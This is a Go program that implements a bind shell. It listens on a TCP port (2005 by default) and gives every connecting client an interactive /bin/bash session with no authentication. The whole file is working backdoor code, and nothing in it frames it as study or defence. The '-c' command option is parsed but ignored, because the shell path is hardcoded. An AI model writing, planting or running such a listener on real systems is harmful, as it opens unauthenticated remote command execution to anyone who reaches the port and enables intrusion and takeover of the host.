package main

import (
	"flag"
	"log"
	"net"
	"os/exec"
)

var command *string

func main() {
	command = flag.String("c", "/bin/bash", "Command to run.")
	network := flag.String("n", ":2005", "Network to listen on.")
	flag.Parse()

	listener, err := net.Listen("tcp", *network)
	if err != nil {
		log.Fatal("Error listening.", err)
	}
	log.Println("Now listening...")

	// Listen for new connections
	// and serve a new shell for each connection
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting connection.", err)
		}
		go run(conn)
	}
}

func run(conn net.Conn) {
	defer conn.Close()
	log.Printf("Connection received from %s.\n", conn.RemoteAddr())
	conn.Write([]byte("Connection established. Opening shell.\n"))

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()

	log.Printf("Shell ended for %s.\n", conn.RemoteAddr())
}
